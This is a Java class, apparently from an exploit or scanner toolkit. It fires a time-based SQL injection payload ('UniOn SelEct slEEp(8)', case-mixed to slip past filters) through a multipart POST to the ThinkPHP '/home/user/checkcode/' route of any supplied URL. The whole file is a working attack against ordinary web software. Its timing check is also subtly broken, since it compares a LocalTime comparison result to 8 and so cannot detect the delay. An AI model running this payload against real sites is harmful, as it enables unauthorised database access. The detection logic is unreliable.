package com.leishianquan.exp;

import com.leishianquan.MainApp;
import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;
import com.leishianquan.view.VulnOverviewController;

import java.time.Duration;
import java.time.LocalTime;

public class thinkphp_checkcode_time_sqli implements BasePayload {

    public boolean checkVUL(String url) throws Exception{

        try {
            LocalTime start_time = LocalTime.now();
            HttpTool.postHttpRequest(url + "/index.php?s=/home/user/checkcode/", "utf-8","multipart/form-data; boundary=--------641902708","----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--");

            if(LocalTime.now().compareTo(start_time)>=8){
                return true;}
        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
            }

        return false;
    }


}